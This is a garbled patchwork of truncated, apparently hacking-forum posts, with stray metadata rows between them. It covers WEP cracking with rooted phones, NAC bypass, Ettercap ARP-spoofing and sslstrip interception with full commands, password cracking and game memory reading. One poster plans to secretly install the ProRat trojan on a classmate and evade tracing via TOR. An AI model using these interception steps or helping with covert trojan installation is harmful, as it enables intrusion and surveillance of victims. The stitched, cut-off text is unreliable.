This is a tutorial for cracking WEP enabled WiFi security with your phone.
This tutorial only applies (currently) to the Samsung Galaxy S2 and the Google Nexus 1.

You will need to root these devices and install packages through an SD card.

So here we go.

1. Install [Busy Box](https://play.google.com/store/apps/details?id=stericson.busybox&amp;feature=nav_result#?t=W251bGwsMSwxLDMsInN0ZXJpY3Nvbi5idXN5Ym94Il0.) and [Terminal Emulator](https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;feature=search_result#?t=W251bGwsMSwxLDEsImphY2twYWwuYW5kcm9pZHRlcm0iXQ..) on your phone

2. Download the proper packages (this is the utility that allows you to put your WIFI chip into monitor mode needed to scan for WEP packets in order to obtain the WEP key.

[Nexus One](http://bcmon.googlecode.com/svn/trunk/bundles/nexus_bundle.zip)
[Galaxy S2](http://bcmon.googlecode.com/svn/trunk/bundles/gs2_bundle.zip)

3. Follow these instructions:


**Cyanogen 7 &amp; Nexus One**
Download the zip: (Above)
Extract the zip on your device (your sdcard will do fine)
Run 'sh setup.sh' on some terminal (adb ssh
Now you have a wifi interface named eth0 in monitor mode
Now run 

'iwconfig eth0' and check that you get a similar output:

    eth0    IEEE 802.11-DS  ESSID:""""  Nickname:""""
              Mode:Monitor  Frequency:2.412 GHz  Access Point: Not-Associated

              Tx excessive retries:0  Invalid misc:0   Missed beacon:0


**Cyanogen 9 &amp; GS2 (I9100)**
Download the zip: (Above)
Extract the zip on your device (your sdcard will do fine)
Run 'sh setup.sh' on some terminal (adb ssh
Now you have a wifi interface named wlan0 in monitor mode
Now run 'iwconfig wlan0' and check that you get an output similar to the one above
GS2 Update:  iwconfig wlan0 will show 'Mode: Managed""

I have been tasked with trying to bypass security measures on both the wireless and wired guest connections.

I will be reaching out to 2 separate networking team mates. One governs the wireless and the other* the wired network. 
Question 1: Are there specific questions that I should be asking the networking teams?

Question 2: Any good tutorials on achieving this goal? I am currently researching different methods. For instance I noticed that there is a product called the [PWN PLUG](http://pwnieexpress.com/pages/nac-802-1x-bypass) that supports NAC/802.lx bypassing tools.

Now. I go to school with a gentleman who likes to harass me, I have chosen to use my computer skills to my advantage. 

The basic idea goes something like this. I would be grateful for any and all corrections or revisions to my plan. I plan on sending him the ProRat trojan, but I know little of how to encrypt files. Or is there anyway I could secretly and remotely install the trojan without ever having to send him a file to click and open? If I were to know his IP, could I use it to install the trojan secretly? Lastly, could I use TOR or a proxy service to help conceal my identity, and decrease the possibility of the hack being traced back to me?

You might say that an uninstaller packed with the program does that anyway. No it does not. More often than not files and reg keys are left behind.

I've always been curious about learning to hack, I saw a lot of posts on what to learn, but I felt like a lot of the suggestions - many of which were good suggestions - are all over the map.  Some people recommend learning programming, or linux, or hardware, or tools, but there doesn't seem to be any kind of path for someone who would be completely new.

From what I've been able to piece together

Learning Linux is something that I know I'll need to do eventually, PHP/Perl, Python, SQL (and Assembly at some point). Python and C are what most people have tended to recommend, but I suppose it depends on what path someone would want to take.

I think it's by this point when I should be at a level where I'd be able to follow along with things in the web games. Seems like a pretty steep learning curve to me. Does this seem like it's a fairly logical progression to really understand what's going on?

I have never used a PC OS other than Windows, but I don't really know which to choose. Sadly, I am on a shared computer, and thus can't have a dual boot, but I could make a bootable DVD or a VM: not sure on those choices either.

1365290480.0,1btmkr,Help with Ettercap and SSL - packets being captured but not forwarded,samling,7,3,4,"**EDIT 2:** Nope

~~EDIT: So of course after writing out this wall of text

~~~

I've spent the past couple days tooling around with Ettercap with a decent amount of success, and browsing remains (relatively) normal on the target machine with the exception of any connections over SSL (i.e. anything on port 443).

A little background info on the environment: I'm using a mid-2011 macbook pro with Ettercap installed via Homebrew. I have a working sslstrip plugin for Ettercap

    sudo ettercap -TqP ""autoadd"" -i en1 -a ""/usr/local/etc/ettercap/etter.conf"" -M arp:remote /192.168.1.1/ /192.168.1.134/

After some trial and error I discovered that setting net.inet.ip.forwarding to 1 before running Ettercap is pointless

    sudo sysctl -w net.inet.ip.forwarding=1

Lastly

    ec_uid = 0
    ec_gid = 0
    redir_command_on = ""ipfw add set %set fwd 127.0.0.1
    redir_command_off = ""ipfw -q delete set %set""

The above is enough to get a basic mitm attack working, the target computer apparently never receives the intercepted packets. I can continue to access any site over normal http (albeit slightly slower, as ping tests have shown me), but any https requests time out. In Ettercap I see something like:

    Sat Apr  6 16:00:50 2013
    TCP  192.168.1.134:57302 --&gt; 173.194.46.9:443 | S

So I know requests are being made and data is being transferred, I get nothing but a blank screen. I would expect a warning page from the phony certificate, but I never see that either. OpenSSL is definitely functional and I'm under the impression that it should be the one generating certs on the fly, but correct me if I'm wrong.

As an aside

1364129389.0,1awt5j,Send AJAX request with cURL,AssholeCountry,6,3,2,"Hello

i want to automate a process that i am only allowed to use every 24h. I already unscrambled the Javascript to get some useful informations. But let me start from the beginning. 

I have this &lt;a&gt;-tag that i want to ""click"":

    &lt;div id=""bump_info"" class=""notice_box""&gt;
        &lt;a href=""#"" id=""bump"" title=""asdasdasd"" class=""site_fbtn""&gt;
            TEXTTEXTTEXT
        &lt;/a&gt;
    &lt;/div&gt; 

Due to the JavaScript i found those two code snippets in the scrambled code. The first is the actual request:

    $('#bump').bind('click'
        if ($('#log_edit').length != 0) {
            alert('Save or cancel the log that is currently in edit mode.')
        } else {
            var options = {};
            options.resource_id = $('input[name=""resource_id""]'
            options.member_id = $('input[name=""member_id""]'
            options.action = 'bump';
            $.get(qajax
                $('#bump_info').empty().append(data).hide().fadeIn('fast')
            }
        }
        return false
    });

And the domain variables in a separate JavaScript file:

    var domain = location.protocol + '//' + location.hostname;
    if (domain == 'http://www.xxx.com') {
        //my_url        = 'http://localhost';
        //bpath         = '/xxx/';
        //cdn_domain           = 'http://localhost';
        my_url = 'http://www.xxx.com';
        bpath = '/';
        cdn_domain = 'http://www.xxx.com';
    } else {
        my_url = 'http://www.xxx.com';
        bpath = '/';
        cdn_domain = 'http://cdn.xxx.com';
    }

But now there is still something missing... The informations for the actual request (resource_id and member_id). I took a look at the HTML again and found this:

    &lt;div class=""hidden""&gt;
        &lt;input type='text' name='member_id' value='550XXX'/&gt;
        &lt;input type=""text"" name=""resource_id"" value=""989XXX""/&gt;
        &lt;input type=""text"" name=""subject_id"" value=""3""/&gt;
        &lt;input type=""text"" name=""group"" value=""resource""/&gt;
        &lt;input type=""text"" name=""server_id"" id=""server_id"" value=""147XXX""/&gt;

        &lt;div id=""resource_updated""&gt;0&lt;/div&gt;
    &lt;/div&gt;

So i played a bit with cURL but without satisfaction. :/
What i have so far is:

    #!/bin/bash
    cookieFILE=""cookies.txt""
    
    curl \
      --trace trace.txt \
      --cookie $cookieFILE \
      --cookie-jar $cookieFILE \
      -H ""X-Requested-With: XMLHttpRequest"" \
      ""http://www.XXX.com/qajax.php?action=bump&amp;resource_id=989XXX&amp;member_id=550XXX"" \
      -vL

My cookies.txt:

    # Netscape HTTP Cookie File
    # http://curl.haxx.se/docs/http-cookies.html
    # This file was generated by libcurl! Edit at your own risk.

    www.xxx.com	FALSE	/	FALSE	0	PHPSESSID	1d851ca3d3086166d0fcXXXXXXXXXXXX

- BackTrack 5 r3
- Windows XP (no SP installed)
- Windows Server 2008 (not R2)
- Ubuntu 10.04
- a couple of Kioptrix VMs

So, that when I ran -sU against the Server 2k8 that the DHCP port wasn't detected. Any ideas why that is? When I would run the same scan against the Linux distros, they were returning ports of interest.

Okay, nothing would happen as the scan would hang there. The same scan against the rest of the targets would return results within 2 seconds. Likewise for the NULL scans. What is the difference between the Server 2008 and Windows XP that one hangs and the other doesn't? Can someone please explain this. Is it because Server 2k8 is more TCP RFC compliant than XP, or less than, and that's why the XP and Linux VMs respond to a XMAS and NULL scan?

Thanks in advance.

1371336945.0,1gf9lc,"John the Ripper, Win XP Pro, Admin password doesn't work?",onecrazydavis,4,9

My dad changed the workgroup/domain on his laptop for some reason

Booted it up in kali, and ran John the Ripper on it. Immediately the crisis was averted, as there is an administrator account named 'Spare', with no password on it. WOOT. That works fine to log in. Now we can change his workgroup back, and get everything working as it should.

Here's why I'm here -- It revealed a 2-part Administrator password that _doesn't work_.

Output looks like this:

    56           (Administrator:2)
    ABC1234      (Administrator:1)

In my case, and only 3 digits long, all seemingly in capitals. When I combine these two lines together to form the _magical_ `ABC123456`, it doesn't work!

I'm not sure what to try. Is it correctly displaying all caps

I have a project in mind

1. Build a computer out of old spare hardware parts
2. Complete HDD format and fresh OS install (Unsure which OS)

I want the computer to be set up so that you *cannot* access the internet in any way whatsoever

Humans fuck up

Things I might want to do on this computer:

* Social websites (Facebook
* IM/Video/Voice chat software (Should be capable of running all the major ones, Skype etc)
* Downloading/Uploading files to the web and other computers directly (Be it via DCC
* Stream video and audio
* E-mail
* Online gaming (Be it via steam or World of Warcraft)
* Operate a RAT (This last one isn't really high priority as again

My ambitions are probably disappointingly boring, honestly, I'll probably just end up using it for some very simple social engineering stuff just to keep my hand in the game. But if you're going to do a thing, might as well do it right.

So let's pretend I'm a super duper evil master criminal bent on world domination

This computer is 100% dedicated to this purpose

Background on the program.  Vector NTI is a sequence analyzer that can be used for many features like cloning, etc.  This program used to be free!  It was awesome, you had an issue with it, you emailed the guy and it was fixed damn near immediately

It has been since sold and sold with a HUGE price tag.  It is now costing $1000/year to use the program, this is potentially TAX dollars paying for this because of where the grant/funding is coming from...).  Did I mention this program WAS free.  The improvements that have been made do not suffice the price tag!  If you have problems with the program, you have to email them with a long turnaround time, or leave a message and they will get back to you in a 24 hour window.  If any one is in science, time is money, and if you are sitting during an experiment, you are literally stuck until the next step...

Basically, blue, repeat). You have a 0.525 second window to select each card. Now here's what makes this a difficult skill to use effectively: After selecting a card, it stores the amount of time it took for you to pick it (ie. if you selected a yellow card .3 seconds into the pick it would save .225). Once you throw the card (it activates on your next autoattack), it starts the cooldown. As soon as the cooldown is up, it begins cycling through again (from the .225 stored before). 

This essentially means that to use the skill perfectly, throughout an entire game (potentially 60+ minutes). If you can't do this (and trust me, very few TF players do this, not even the super high level ones) then you have to wait a second after casting it to pull the correct card.

What I want to do is somehow read data from the game (ie. that the CD is up) and automatically display which card would be selected if you were to double tap W and lock one in instantly. My main problem is that I don't understand how to get this data; doing the rest should be fairly simple for me.
